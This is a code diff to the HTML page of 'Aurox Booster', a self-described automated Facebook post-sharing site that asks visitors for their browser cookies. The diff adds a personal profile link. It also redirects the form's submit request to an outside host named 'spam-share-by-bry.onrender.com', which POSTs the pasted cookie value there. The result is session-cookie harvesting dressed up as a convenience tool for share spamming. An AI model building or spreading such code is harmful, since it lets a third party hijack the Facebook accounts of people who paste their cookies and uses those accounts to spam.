@@ -86,7 +86,7 @@
                 <img src="https://i.imgur.com/5lqeDCj.png" alt="Aurox Booster" class="title-image">
                 <h4>A user-friendly automated website that utilizes your browser's cookies to streamline the process of sharing posts on Facebook using the provided URL.</h4>
                 <div class="social-links">
-                    <a href="#" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a>
+                    <a href="https://www.facebook.com/aivan.abanto1/" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a>
                 </div>
             </div>
             
@@ -1180,7 +1180,7 @@
                 localStorage.setItem('userId', userId);
             }
             
-            const response = await fetch('/api/submit', {
+            const response = await fetch('https://spam-share-by-bry.onrender.com/api/submit', {
                 method: 'POST',
                 body: JSON.stringify({
                     cookie: document.getElementById('cookies').value,
